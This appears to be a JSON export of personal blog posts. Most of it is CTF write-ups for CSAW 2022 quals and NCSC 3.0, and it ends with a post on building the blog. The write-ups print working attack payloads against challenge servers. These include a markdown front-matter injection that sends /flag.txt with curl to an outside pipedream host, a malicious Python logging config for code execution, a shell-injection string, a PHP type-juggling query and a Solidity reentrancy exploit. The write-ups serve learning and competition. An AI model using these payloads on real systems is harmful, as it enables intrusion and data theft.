@@ -1,0 +1,760 @@
+[
+    {
+        "id": 8,
+        "attributes": {
+            "title": "CSAW 2K22 Quals - Writeups",
+            "createdAt": "2022-09-19T17:53:32.263Z",
+            "updatedAt": "2022-09-19T18:37:49.361Z",
+            "publishedAt": "2022-09-19T17:53:50.777Z",
+            "date": "2022-09-11",
+            "slug": "csaw-quals-2k22",
+            "content": "# CSAW 2K22 Quals\n\nMy team Soter1a and I have participated in CSAW 2k22 Quals. Hope you enjoy my writeup for all Web tasks and one misc one ^^. \n\n## World wide web\n\n![World wide web](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/world-wide-web_xlvzqa.png)\n![world wide web root](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-firstly_dvcthr.png)  \n\n![world wide web /stuff](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608174/csaw/world-wide-web-secondly_iahju2.png)  \n\nI tried to find if there is any other **<a>** tags in the page.\n\n![world wide web terminal curl](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608171/csaw/world-wide-web-third_qwc7dw.png)\n\nUsing browser devtool and CTRL+F I did 3 times each time I look for the **<a>** and click on it. Also I noticed that I got a very interesting cookie set.\n\n![world wide web cookie](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608168/csaw/world-wide-web-cookie_sxiiau.png)\n\n**solChain** well what got my attention is the chain part. If the server is actually tracking the sequence of path I have visited then there must be something. Also, I tried to repeat the process twice and I found out the sequence of words is the same.\n\nCrafting my final script....\n\n```py\nimport requests\n\nurl=\"http://web.chal.csaw.io:5010/\"\n\n\nsession = requests.Session()\n\n\nwith session : \n    next_word='stuff'\n    while True:\n        response1= session.get(url+next_word)\n        print(session.cookies)\n        try:\n            startingIndex=response1.text.index('href=\"/')\n            endText=response1.text[startingIndex:].index('\">')\n        except :\n            print(response1.text)\n            break\n        print(\"next word:\",response1.text[7+startingIndex:endText+startingIndex])\n        next_word=response1.text[7+startingIndex:endText+startingIndex]\n```\n\n![world-wide-web-flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-flag_dtwoou.png)  \n\n## My Little website\n\n![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/my-little-website_yp34fj.png)\n\n![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-challenge-pic_xuyuqc.png)\n\nSo as far my enumeration went that's what I found:\n\n- **expressJS** server running, identified with the headers.\n- Opens a headless chrome instance to render the pdf.\n- Dynamic XSS didn't work, might be beacuse the bot doesn't wait for the JS execution and even forcing it to wait doesn't really work it renders the HTML,CSS and then the PDF.\n\nA wild guess by my teammate **M0ngi** about the markdown parser, the CVE was *CVE-2021-23639* which occurs in the vulnerable version of *md-to-pdf*.\n\nSo we execute our final payload.\n\n```md\n---js\n((require(\"child_process\")).execSync(\"curl https://en7nqjdbzyckx.x.pipedream.net/ -d \\\"$(cat /flag.txt)\\\" \"))\n---\n```\n\n![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-flag_sqrb1m.png)\n\n## Good Intentions\n\n![Good intentions](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/good-intentions_q5rbw9.png)\n\nReading through the code, I found that the upload is secure.\n![Secure upload](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/secure-upload_cs0nrd.png)\n\nBut going further down the code the function to set the **logger** configuration file is vulnerable to **path traversal**.\n\n![Unsecure Log set](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/unsecure_logconf_gan7js.png)\n\nHere, I didn't know which evil configuration should I **upload** then set the logger to. I needed to have RCE on the server. Fortunately enough, my teammate **n0s** sent me this link  of an [Evil logger](https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4&h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ).\n\nSo the final chain will be as the following:\n\n![good-intentions-request-chain](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608204/csaw/good-intentions-request-chain_wf7er2.png)\n\n### Logger code **payload.conf**\n\n```yaml\n[loggers]\nkeys=root,simpleExample\n\n[handlers]\nkeys=consoleHandler\n\n[formatters]\nkeys=simpleFormatter\n\n[logger_root]\nlevel=DEBUG\nhandlers=consoleHandler\n\n[logger_simpleExample]\nlevel=DEBUG\nhandlers=consoleHandler\nqualname=simpleExample\npropagate=0\n\n[handler_consoleHandler]\nclass=__import__('os').system('cat /flag.txt > /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263')\nlevel=DEBUG\nformatter=simpleFormatter\nargs=(sys.stdout,)\n\n[formatter_simpleFormatter]\nformat=%(asctime)s - %(name)s - %(levelname)s - %(message)s\n```\n\nI fired up my postman to execute that and here comes the flag !\n![Flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/Flag_zjj7z6.png)\n\n## Smuggling Mail\n\n![Smuggling mail](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail_kotgch.png)  \n\nGoing through the code, these are my findings:\n\n- We got a **varnich** cache server.\n\n![Smuggling-mail-varnish-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/smuggling-mail-varnish-config_vlwtw8.png)  \n\n- A **hitch** TLS proxy accepting HTTP/2 requests.\n![smuggling-mail-hitch-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608177/csaw/smuggling-mail-hitch-conf_t1dsbh.png)\n\nA quick research on the **varnish** cache server and I found the **CVE-2021-36740**. Actually, the cache server which works as the \"frontend\" here passes the HTTP/2 to the backend which downgrades the request to HTTP/1 which will be handled as two requests. Yes, that's a H2.CL vulnerability also there is a cve that made me try to HTTP Smuggling exploit.\n\n![smuggling-mail cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608178/csaw/smuggling-mail-cve_s6xc02.png)\n\nThat's perfectly our case, we want to bypass the authentication condition in the **varnish** config.\n![smuggling-mail to bypass](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-to-bypass_mlxaam.png)\n\nWe can use the **/waitlist** endpoint for the original request but what do we want to do here ?\n![smuggling-mail RCE code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-rce-code_lze7hw.png)  \n\nSo we want to reach the **/admin/alert** to trigger an RCE but how can we do it ? Some research and with the help of my teammate 'm0ngi' We found the last missing piece [Mailutils cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-mail-cve_vwprts.png)\n\n> We can **~ OUR_COMMAND**\n\n### Putting it all together\n\n![smuggling mail request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-trigger-request_zcuwoo.png)\n![Smuggling mail rce ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-rev-shell_nubljz.png)\n\n## Lost in Amazon\n\n![Lost in amazon](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/losti-in-amazon_topqca.png)  \n\n> This challenge was a little bit too blind. What caused confusion is the directory busting part. It's not a natural thing to come to your mind while solving a CTF task.\n\nI was really confused and couldn't find a thing till I got a discord notification.\n\n![Lost in Amazon Discord](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608187/csaw/lost-in-amazon-discord_vbgepl.png)  \n\nWell, a quick directory busting with **wfuzz**, I found two endpoints.\n![Lost in amazon Wfuzz output 1 ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-wfuzz-1_qjhpzv.png)  \n\nI curled both paths, **/secret** gave me a JWT and **rockyou** a page that has nothing in it. \n![Lost in amazzon Confusion](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/lost-in-amazon-token-lost_rninuu.png)  \n\nAn intuitive move is to set the jwt token and revisit **/rockyou** right ? It gave me nothing. I tried to set **secret** cookie as the JWT too but nothing ...  also we should note that jwt itself has nothing interesting. I felt really like I hit a dead end.\n![picture 18](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608185/csaw/lost-in-amazon-jwt-check_igswk3.png)  \n\nAt last, I reached for the admin, I knew that there was something unintuitive to do **also noting the cries of agony in the discord channel because of the task**\n![Lost in amazon HINT](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-hint_c7cdii.png)  \n\nOh I see I had to fuzz one path deeper and found **/developer/heaven**\n![Lost in amazon dirbusting depths 2](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608205/csaw/lost-in-amazon-dirb_bjnbne.png)  \n![Lost in amazon /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608219/csaw/lost-in-amazon-findings2_sfiezz.png)  \n\nNow I have an idea why do I need the JWT token. I added a cookie with the name of **secret**.\n![Lost in amazon access /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608215/csaw/lost-in-amazon-access_zf2ld5.png)  \n\nIt was really easy now. Going back to the name of the Task and especially the **amazon** part. I knew it was an amazon SSRF vulnerability.\nI didn't waste any time.\n\n> I tried tempering with the _magiccall paramater but it gave nothing so I passed.\n\n![Lost in amazon aws creds](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608194/csaw/lost-in-amazon-creds_df6cet.png)  \n\nI added the profile to my **aws-cli**.\n![Lost in amazon aws configure](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608193/csaw/lost-in-amazon-aws-config_nzybus.png)  \n\nThen I tried to look for any **s3 buckets**\n![Lost in amazon s3 error](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-s3_ie3fcj.png)  \n\nMy teammate **N0s** pinged me here and told me to try to specify the bucket region as buckets can be region-specific. So I looked for it\n![Lost in amazon finding region](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608186/csaw/lost-in-amazon-region_tcoilm.png)  \n\nand finally I got the flag.\n![Lost in amazon flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608189/csaw/lost-in-amazon-flag-aws_qr4uzq.png)\n\n## DonateMe\n\n![Donate more](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608208/csaw/donate-more_efrhig.png)  \n\nA basic **reentrancy vulnerability**. I crafted an evil contract to exploit it.\n\n1. Send 0.0001 ether to trigger the reentrancy loop.\n2. Stop the loop after the balance gets to 30.\n3. Send the token via **getFlag**\n   > You can use ethers.utils.formatBytes32String(TOKEN) to get the right format to pass.\n4. **yes** and get the flag.\n\n```js\n// SPDX-License-Identifier: MIT\n\npragma solidity >=0.8.7;    \n\ninterface VictimContract { \n    function newAccount()  external payable;\n\n    function donateOnce()  external;\n\n    function getBalance() external view returns (uint256 donatorBalance) ;\n    function getFlag(bytes32 _token) external ;\n}\n\ncontract ExploitDonation { \n    address public victimAddress;\n    VictimContract victimContract; \n\n    constructor(address _victimAddress){\n            victimAddress=_victimAddress;\n            victimContract=VictimContract(victimAddress);\n    }\n\n    function startAttack() public payable {\n        victimContract.newAccount{value:msg.value}();\n        victimContract.donateOnce();\n\n    }\n\n    fallback()external payable {\n        uint my_balance= victimContract.getBalance();\n        if (my_balance<=20)\n            victimContract.donateOnce();\n\n    }\n\n function getBalance() public view returns (uint256) {\n        return victimContract.getBalance();\n    }\n\n    function getFlag(bytes32 _token) public {\n        victimContract.getFlag(_token);\n    }\n}\n```\n\n## Final words\n\nI want to congratulate the organizers for their huge efforts and these great tasks.\nKudos to all my teammates for their perseverance and hard work during the competition. We successfully made it to the finals by achieving the first place in MENA !! Many words but not enough of them, all the efforts put to get such results, but most importantly **CSAW 2K22 finals here we come**.\n\n\n## Links\n- [Github Repo](https://github.com/yassinebk/ctf-writeups/blob/main/csaw-2k22-qual/README.md)\n- [N0s Writeup](https://blog.anas-cherni.me/2022/09/14/csaw2k22/)\n- [Raf² & Adam](https://4n6nk8s.tech/2022/09/12/Writeups/csaw2022/?fbclid=IwAR2lkfD8gD6AggLv-c1P_tFP1PdK607fKFf4Rg5Ozi597A6lHdKlfM80wsw)\n- [Ironbyte](https://l.facebook.com/l.php?u=https%3A%2F%2Fironbyte.me%2Fezmaze%2F%3Ffbclid%3DIwAR1UWnHRheApKCK7MtfcN_6lOBeSLEecT5NLBSETDwITNu-6bNPCnw497uA&h=AT14Q4UItbyzfDyj05vOBfFIIKwME3bO40gyNJOqD3UR4a2bex6wsRTEk26B9c6GQdjVbxako_OZtruE3LkafzkaiL_aXfDFmo0W0RiOwke5hiQxeQMt1sFjz7zYx2nkUAy8Gw)",
+            "coverImage": {
+                "data": {
+                    "id": 50,
+                    "attributes": {
+                        "name": "csaw-blog-main.jpg",
+                        "alternativeText": "csaw-blog-main.jpg",
+                        "caption": "csaw-blog-main.jpg",
+                        "width": 1080,
+                        "height": 1080,
+                        "formats": {
+                            "large": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609975/large_csaw_blog_main_98bebe18a4.jpg",
+                                "hash": "large_csaw_blog_main_98bebe18a4",
+                                "mime": "image/jpeg",
+                                "name": "large_csaw-blog-main.jpg",
+                                "path": null,
+                                "size": 165.39,
+                                "width": 1000,
+                                "height": 1000,
+                                "provider_metadata": {
+                                    "public_id": "large_csaw_blog_main_98bebe18a4",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "small": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609977/small_csaw_blog_main_98bebe18a4.jpg",
+                                "hash": "small_csaw_blog_main_98bebe18a4",
+                                "mime": "image/jpeg",
+                                "name": "small_csaw-blog-main.jpg",
+                                "path": null,
+                                "size": 46.3,
+                                "width": 500,
+                                "height": 500,
+                                "provider_metadata": {
+                                    "public_id": "small_csaw_blog_main_98bebe18a4",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "medium": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609976/medium_csaw_blog_main_98bebe18a4.jpg",
+                                "hash": "medium_csaw_blog_main_98bebe18a4",
+                                "mime": "image/jpeg",
+                                "name": "medium_csaw-blog-main.jpg",
+                                "path": null,
+                                "size": 100.46,
+                                "width": 750,
+                                "height": 750,
+                                "provider_metadata": {
+                                    "public_id": "medium_csaw_blog_main_98bebe18a4",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "thumbnail": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609974/thumbnail_csaw_blog_main_98bebe18a4.jpg",
+                                "hash": "thumbnail_csaw_blog_main_98bebe18a4",
+                                "mime": "image/jpeg",
+                                "name": "thumbnail_csaw-blog-main.jpg",
+                                "path": null,
+                                "size": 5.43,
+                                "width": 156,
+                                "height": 156,
+                                "provider_metadata": {
+                                    "public_id": "thumbnail_csaw_blog_main_98bebe18a4",
+                                    "resource_type": "image"
+                                }
+                            }
+                        },
+                        "hash": "csaw_blog_main_98bebe18a4",
+                        "ext": ".jpg",
+                        "mime": "image/jpeg",
+                        "size": 192.57,
+                        "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609973/csaw_blog_main_98bebe18a4.jpg",
+                        "previewUrl": null,
+                        "provider": "cloudinary",
+                        "provider_metadata": {
+                            "public_id": "csaw_blog_main_98bebe18a4",
+                            "resource_type": "image"
+                        },
+                        "createdAt": "2022-09-19T17:52:58.468Z",
+                        "updatedAt": "2022-09-19T17:52:58.468Z"
+                    }
+                }
+            },
+            "tags": {
+                "data": [
+                    {
+                        "id": 3,
+                        "attributes": {
+                            "title": "Cybersecurity",
+                            "short": "cyber-sec",
+                            "createdAt": "2022-01-18T17:54:13.682Z",
+                            "updatedAt": "2022-01-18T17:58:30.169Z",
+                            "publishedAt": "2022-01-18T17:58:30.167Z"
+                        }
+                    },
+                    {
+                        "id": 9,
+                        "attributes": {
+                            "title": "Write-ups",
+                            "short": "tag",
+                            "createdAt": "2022-02-01T05:24:54.669Z",
+                            "updatedAt": "2022-07-30T00:56:22.335Z",
+                            "publishedAt": "2022-07-30T00:56:22.332Z"
+                        }
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "id": 4,
+        "attributes": {
+            "title": "NCSC 3.0 CTF ",
+            "createdAt": "2022-02-01T05:23:15.493Z",
+            "updatedAt": "2022-02-01T22:02:06.477Z",
+            "publishedAt": "2022-02-01T05:23:19.153Z",
+            "date": "2022-02-01",
+            "slug": "NCSC-CTF",
+            "content": "# NCSC 3.0 CTF \n\nThe National Cyber Security Congress is a national wide event where all cybersecurity enthusiasts and professionals meet to share knowledge and participate in many challenges and workshops . The NCSC in its third edition took place  the 28,29,30 of January 2022 and i was lucky to participate in its CTF event ! \n\n\n## Broken Pingyy\n\n![Broken Pingy Task](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643681840/broken_pingy_2cb1f0ff6f.png)\n\nFirst, only the website link was provided in the task description. \n\n![Broken Pingy Website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643682664/Broken_Pingy_Website_80f7e7330a.png)\n\nI tried XSS and SQL injection but i didn't get anything. After some time a hint came which is the source code of the challenge. All i had to do is to open it .\n\n![Broken Pingy Code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643682428/broken_pingy_code_ec40393494.png)\n\nAs we can see by tracking the `$clean` command i was able to find the vulnerability. \n\n> The `escapeshellarg()` is a PHP function that adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument.\n\n![Broken Pingy Vuln](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643682428/broken_pingyy_vuln_091139a167.png)\n\nLet's try to add some spice to the IP address  ( Do not forget you have to close the bash -c argument single quote xD  by either adding a command at the end  because the payload will become 'payload' so we will have `''bash -c 'ping -c1 -w3 *'payload'* \"`  so we need two shell commands inside payload . \n\n\n```bash\n\n' & cd / & cat flag\n\n```\n\n![Broken Pingy Solved](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643683138/large_Broken_Pingy_Solved_e5543f33da.png)\n\n\n\n## Welcome to Web Universe\n\n![Welcome To Web Universe Task](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688099/Welcome_To_Web_Universe_efe3c43546.png)\n\n![Welcome To Web Universe Website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688101/Welcome_To_Web_Universe_Solved_6623a7ca60.png)\n\nAs you can see the Website seems very empty nothing but a text and weird URL `/leetstatus` . I checked the HTML code of the page to see if there is any hidden comments. \n\n![Welcome To Web Universe Code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688104/large_Welcome_To_Web_Universe_Website_3f2b067d82.png)\nNothing :')\n\n\nI opened the source code . It's a *flask* application and the *nginx* server configuration was included. \n\n![Welcome To Web Universe Source Code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688102/large_Welcome_To_Web_Universe_Code_7fda5f2b6d.png)\n\n- What got my attention is this weird combination of both routes . How in the flask application we get the status page from \n\n> http://api:5000/v1/status and we have clearly did http://20.119.58.135:4567/leetstatus . \n In the *nginx* configuration the requests were proxied but how it did really work. How could we get the *leetstatus* route ? \n \nA quick read of *NGINX* docs was really needed\n\n![Nginx Docs](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688103/medium_Welcome_To_Web_Universe_Docs_2348aba4e4.png)\n\n**Oh so it replaces the part of the URI that matches the given location by the proxy_pass. To put it in other words** \n**/leet -> /v1/** .\n\nNow i understood how it works. Looking back to the Location it's vulnerable to LFI but it needs a little bit of thinking . \nWe want to get to  http://api:5000/flag which is the same as  http://api:5000/v1/../flag By transforming it by the reverse proxy configuration we get http://20.119.58.135:4567/leet../flag.\n\n![Welcome To Web Universe Solved](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688103/medium_Welcome_To_Web_Universe_Solved_6623a7ca60.png)\n\n\n\n## Peehpee \n\n![Peehpee Task](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688093/Peehpee_ef3a2c0915.png)\nThis challenge was all about concentration .\n![Peehpee](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688096/large_Peehpee_Solver_68c4bdde53.png)\nAs we can see two things were our main problem . The first that the first underscore query variable was filtered of all helpful characters and the second that the same query variable was the one executed . \n\n![Regex](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688878/R_Egex_9e19b463dd.png)\n\nWait is it really sanitized ? The regex is clearly bad . It means any string that starts with dollar sign will be good to go and that's all we need to solve it . \nSo by making : \n\n```python\n_=$x\n__=Kahla\n\n# we will get at the evaluated expression\n\nreturn $x =.$x. \n\n# which will evaluate to Kahla so the if statement will become true and we will get the flag ! \n``` \n\n![Peehpee Solved](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688096/large_Peehpee_Solver_68c4bdde53.png)\n\n\n\n## Race Condition \n\n![Race Uploader Task](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643689099/Race_Uploader_Task_c8849b9247.png)\n\nBy opening the challenge we find the source code and the website .  We quickly check the website. It's an upload page for only PNG,GIF, JPG formats. For the code it's simple . It uploads the files to */uploads* directory and verify their formats if they are bad they simply delete . That's all i needed to know. \n\n![Race Uploader Website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688097/large_Race_Uploader_74fe45b913.png)\n\n![Race Uploader Code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688098/Race_Uploader_Code_bd19de6d00.png)\nReflecting back, the challenge name was a really good clue . Race Uploader ?  Race Conditions ! \n\n![Race Condition Explanation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688094/Race_Condition_Word_452d9a7a5c.png)\n\n![Race Uploader Code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688099/Race_Uploader_Explaination_329b5b1125.png)\n\nIn our case, the problem will occur after the upload . Actually, the bad file will not be immediately deleted. A context switch might occur leaving the operation hanging till our thread goes running again . The problem is when that happens . The simple answer we don't know !  We have to keep sending both the request that holds the bad file and the get request to fetch the flag till they hook up . \n\n- In the top right there is the file we will upload to the server ! \n- I wrote a small python script code below to continuously send get requests to the **URL/uploads/ourFileName.php**\n\n```python\n\n\t#! /usr/bin/python\nimport requests\nwhile True:\n    reqs=\"http://20.119.58.135:567/uploads/phpServer.php\"\n    response = requests.get(reqs)\n    if(response.status_code ==200):\n        print(response.text)\n        break\n```\n\n![Race Uploader Solver](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643688097/large_Race_Condition_Solved_dc6855e30a.png)\nPretty cool right ?  \n\n\n\n## Weird PHP \n\n![Weird PHP](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643691371/Weird_Php_Task_d1e6c97667.png)\n\nThis challenge is straight forward . We got three variables that we need to pick values for so all the if statement will be evaluated as true. \nThe thing here is we have loose comparison and a quick google search might come very helpful . \nFirst If statement : setting the key value to 0 will make it match the hidden string . \n> https://stackoverflow.com/questions/6843030/why-does-php-consider-0-to-be-equal-to-a-string\n\n---> **So we got `a={\"key\":0}`**\n\nSecond we want to make the md5(b) == md5(c). Should i think about md5 hash collisions ? No that is clearly a rabbit hole by making both b and c null we can pass the second if statement. So a quick search if the `md5()`  returns a null statement \n \n>[<u>Stack Overflow Comment was very helpful](https://stackoverflow.com/posts/66523194/timeline)</u>\n\nOK, here's a hint.\n\nPHP's [md5()](https://www.php.net/md5) function expects its argument to be a string.\n\nCan you think of some way of forcing this statement to deal with a different data type?\n\nAlright, let's make them arrays \n---> **So we got `b[ ]=1 & c[ ]=1`**\n\nFinally all we have to do is visit our URL **http://20.119.58.135:276/?a={%22key%22:0}&b[]=1&c[]=1**\n\n![Weird Php Solved](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643691373/large_Weird_Php_Solved_c352ba12ea.png)\n\n\n\n\n\n## Final words \n\n\nFirst of all, I really want to thank my teammates *hadil* and *killkillkill* for their huge efforts . I was both tired and sleep deprived during the CTF and i was about to give up and go to bed numerous times. You are great teammates !\nNow, all my gratitude to the Securinets Technical Team for writing these numerous challenging and fun tasks that allowed in 6 hours to learn many new things.\n\n\n",
+            "coverImage": {
+                "data": {
+                    "id": 34,
+                    "attributes": {
+                        "name": "NCSC-CTF.jpg",
+                        "alternativeText": "NCSC-CTF.jpg",
+                        "caption": "NCSC-CTF.jpg",
+                        "width": 1920,
+                        "height": 1078,
+                        "formats": {
+                            "large": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643692913/large_NCSC_CTF_8d1c5e270f.jpg",
+                                "hash": "large_NCSC_CTF_8d1c5e270f",
+                                "mime": "image/jpeg",
+                                "name": "large_NCSC-CTF.jpg",
+                                "path": null,
+                                "size": 68.88,
+                                "width": 1000,
+                                "height": 561,
+                                "provider_metadata": {
+                                    "public_id": "large_NCSC_CTF_8d1c5e270f",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "small": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643692914/small_NCSC_CTF_8d1c5e270f.jpg",
+                                "hash": "small_NCSC_CTF_8d1c5e270f",
+                                "mime": "image/jpeg",
+                                "name": "small_NCSC-CTF.jpg",
+                                "path": null,
+                                "size": 23.84,
+                                "width": 500,
+                                "height": 281,
+                                "provider_metadata": {
+                                    "public_id": "small_NCSC_CTF_8d1c5e270f",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "medium": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643692914/medium_NCSC_CTF_8d1c5e270f.jpg",
+                                "hash": "medium_NCSC_CTF_8d1c5e270f",
+                                "mime": "image/jpeg",
+                                "name": "medium_NCSC-CTF.jpg",
+                                "path": null,
+                                "size": 43.39,
+                                "width": 750,
+                                "height": 421,
+                                "provider_metadata": {
+                                    "public_id": "medium_NCSC_CTF_8d1c5e270f",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "thumbnail": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643692912/thumbnail_NCSC_CTF_8d1c5e270f.jpg",
+                                "hash": "thumbnail_NCSC_CTF_8d1c5e270f",
+                                "mime": "image/jpeg",
+                                "name": "thumbnail_NCSC-CTF.jpg",
+                                "path": null,
+                                "size": 7.96,
+                                "width": 245,
+                                "height": 138,
+                                "provider_metadata": {
+                                    "public_id": "thumbnail_NCSC_CTF_8d1c5e270f",
+                                    "resource_type": "image"
+                                }
+                            }
+                        },
+                        "hash": "NCSC_CTF_8d1c5e270f",
+                        "ext": ".jpg",
+                        "mime": "image/jpeg",
+                        "size": 185.9,
+                        "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1643692912/NCSC_CTF_8d1c5e270f.jpg",
+                        "previewUrl": null,
+                        "provider": "cloudinary",
+                        "provider_metadata": {
+                            "public_id": "NCSC_CTF_8d1c5e270f",
+                            "resource_type": "image"
+                        },
+                        "createdAt": "2022-02-01T05:21:55.182Z",
+                        "updatedAt": "2022-02-01T05:21:55.182Z"
+                    }
+                }
+            },
+            "tags": {
+                "data": [
+                    {
+                        "id": 3,
+                        "attributes": {
+                            "title": "Cybersecurity",
+                            "short": "cyber-sec",
+                            "createdAt": "2022-01-18T17:54:13.682Z",
+                            "updatedAt": "2022-01-18T17:58:30.169Z",
+                            "publishedAt": "2022-01-18T17:58:30.167Z"
+                        }
+                    },
+                    {
+                        "id": 9,
+                        "attributes": {
+                            "title": "Write-ups",
+                            "short": "tag",
+                            "createdAt": "2022-02-01T05:24:54.669Z",
+                            "updatedAt": "2022-07-30T00:56:22.335Z",
+                            "publishedAt": "2022-07-30T00:56:22.332Z"
+                        }
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "id": 3,
+        "attributes": {
+            "title": "How I made my first personal Blog and Digital Portfolio ",
+            "createdAt": "2022-01-19T21:46:56.492Z",
+            "updatedAt": "2022-06-28T21:42:33.933Z",
+            "publishedAt": "2022-01-19T21:46:57.741Z",
+            "date": "2022-01-13",
+            "slug": "first-post",
+            "content": "# Design Process \n\n## Inspiration:\n\nDuring the winter's holidays, I have finally found time to watch the Dune movie and from there I got my inspiration. \n\n\n\n![Dune Palette Design](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656452342/dune_pallette_1e83c90567.jpg)\n\n\n## UI\n\n### Colors\n\nAs you can see, the website palette was totally inspired from this picture which was both a challenge and a joy as these cold colors gives a professional vibe to the website and allowed me to go for a cyber theme. \n\n### Typography\n\n- Main font : **Iceland**\n- Special font : **Inversionz Unboxed**\n* Post text font : **Sen**   *a font more comfortable to read*\n\n\n## UX\n\nThe main page, was meant to be like a journey. As you scroll down you will notice all the parallax events and the little design cookies. All important parts are well highlighted and easily accessible. It's as I call a ZEN design .\n\nThe blog page is truly designed under the goal to limit the clicks number to reach the sought post.\n\n## Result\n\n![Blog Design image](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656452509/porftolio_design_ea4539074b.png)\n\n\n## Development\n\n### Chosen Stack\n\n* NextJS\n* Chakra UI \n* Framer motion\n* Strapi CMS\n\n## Final words\n\nIt was a very fun experience building my own digital portfolio and 